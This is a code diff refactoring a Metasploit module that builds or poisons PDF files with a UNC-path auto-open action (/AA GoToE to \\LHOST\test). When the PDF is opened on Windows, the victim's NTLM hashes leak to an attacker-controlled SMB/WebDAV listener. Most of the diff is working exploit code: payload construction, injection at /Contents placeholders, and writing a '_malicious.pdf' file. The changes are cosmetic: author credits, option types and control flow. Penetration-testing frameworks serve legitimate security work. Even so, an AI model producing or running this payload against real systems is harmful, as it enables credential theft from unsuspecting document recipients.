@@ -15,10 +15,12 @@ class MetasploitModule < Msf::Auxiliary
           code into an existing PDF document if possible.
         },
         'License'       => MSF_LICENSE,
-        'Author'        =>
+        'Author'        => 
             [
-              'Richard Davy - secureyourit.co.uk',  #Module written by Richard Davy
-              'CheckPoint researchers - Assaf Baharav, Yaron Fruchtmann, Ido Solomon' #Code provided as POC by CheckPoint Researchers
+              'Assaf Baharav',    # Code provided as POC by CheckPoint 
+              'Yaron Fruchtmann', # Code provided as POC by CheckPoint 
+              'Ido Solomon',      # Code provided as POC by CheckPoint 
+              'Richard Davy - secureyourit.co.uk',  # Metasploit
             ],
         'Platform'      => [ 'win' ],
         'References'    =>
@@ -32,16 +34,16 @@ class MetasploitModule < Msf::Auxiliary
       [
         OptAddress.new("LHOST", [ true, "Host listening for incoming SMB/WebDAV traffic", nil]),
         OptString.new("FILENAME", [ false, "Filename"]),
-        OptString.new("PDFINJECT", [ false, "Path and filename to existing PDF to inject UNC link code into"]),
+        OptPath.new("PDFINJECT", [ false, "Path and filename to existing PDF to inject UNC link code into"]),
 
       ])
   end
 
   def run
-    if datastore['PDFINJECT']!=nil and datastore['PDFINJECT'].chars.last(3).join == "pdf"
+    if !datastore['PDFINJECT'].nil? && datastore['PDFINJECT'].to_s.end_with?('.pdf')
         injectpdf
     else
-        if datastore['FILENAME']!=nil and datastore['FILENAME'].chars.last(3).join == "pdf"
+        if !datastore['FILENAME'].nil? && datastore['FILENAME'].to_s.end_with?('.pdf')
           createpdf
         else
           print_error "FILENAME is empty, please enter FILENAME and rerun module"
@@ -53,43 +55,45 @@ class MetasploitModule < Msf::Auxiliary
     #Payload which gets injected
     inject_payload = "/AA <</O <</F (\\\\\\\\#{datastore['LHOST']}\\\\test)/D [ 0 /Fit]/S /GoToE>>>>"
 
-    if File.exists?(datastore['PDFINJECT'])
-      #Read in contents of file
-      content = File.read(datastore['PDFINJECT'])
-
-      #Check for place holder - below ..should.. cover most scenarios.
-      if content.index("/Contents 2 0 R") != nil
-        #If place holder exists create new file content
-        newdata = content[0..(content.index('/Contents 2 0 R')+14)]+inject_payload+content[(content.index('/Contents 2 0 R')+15)..-1]
-      elsif content.index("/Contents 4 0 R") != nil
-        #If place holder exists create new file content
-        newdata = content[0..(content.index('/Contents 4 0 R')+14)]+inject_payload+content[(content.index('/Contents 4 0 R')+15)..-1]
-      elsif content.index("/Contents 6 0 R") != nil
-        #If place holder exists create new file content
-        newdata = content[0..(content.index('/Contents 6 0 R')+14)]+inject_payload+content[(content.index('/Contents 6 0 R')+15)..-1]
-      elsif content.index("/Contents 8 0 R") != nil
-        #If place holder exists create new file content
-        newdata = content[0..(content.index('/Contents 8 0 R')+14)]+inject_payload+content[(content.index('/Contents 8 0 R')+15)..-1]
-      end
-
-      if newdata != nil
-        newfilename = datastore['PDFINJECT'][(0..(datastore['PDFINJECT'].length-5))]+"_malicious.pdf"
-        #Write content to file
-        File.open(newfilename, 'wb') { |file| file.write(newdata) }
-        #Check file exists and display path or error message
-        if File.exists?(newfilename)
-          print_good("Malicious file writen to "+newfilename)
-        else
-          print_error "Something went wrong creating malicious PDF file"
-        end
-      #If place holder cannot be found display error message
-      else
-        print_error "Could not find placeholder to poison file this time...."
-      end
-    else
+    unless File.exists?(datastore['PDFINJECT'])
       #If file not found display error message
       print_error "File doesn't exist #{datastore['PDFINJECT']}"
+      return
     end
+
+    #Read in contents of file
+    content = File.read(datastore['PDFINJECT'])
+
+    #Check for place holder - below ..should.. cover most scenarios.
+    if content.index("/Contents 2 0 R") != nil
+      #If place holder exists create new file content
+      newdata = content[0..(content.index('/Contents 2 0 R')+14)]+inject_payload+content[(content.index('/Contents 2 0 R')+15)..-1]
+    elsif content.index("/Contents 4 0 R") != nil
+      #If place holder exists create new file content
+      newdata = content[0..(content.index('/Contents 4 0 R')+14)]+inject_payload+content[(content.index('/Contents 4 0 R')+15)..-1]
+    elsif content.index("/Contents 6 0 R") != nil
+      #If place holder exists create new file content
+      newdata = content[0..(content.index('/Contents 6 0 R')+14)]+inject_payload+content[(content.index('/Contents 6 0 R')+15)..-1]
+    elsif content.index("/Contents 8 0 R") != nil
+      #If place holder exists create new file content
+      newdata = content[0..(content.index('/Contents 8 0 R')+14)]+inject_payload+content[(content.index('/Contents 8 0 R')+15)..-1]
+    end
+
+    if newdata.nil?
+      print_error "Could not find placeholder to poison file this time...."
+      return
+    end
+      
+    newfilename = datastore['PDFINJECT'][(0..(datastore['PDFINJECT'].length-5))]+"_malicious.pdf"
+    #Write content to file
+    File.open(newfilename, 'wb') { |file| file.write(newdata) }
+    #Check file exists and display path or error message
+    if File.exists?(newfilename)
+      print_good("Malicious file writen to "+newfilename)
+    else
+      print_error "Something went wrong creating malicious PDF file"
+    end
+      
 
   end
 
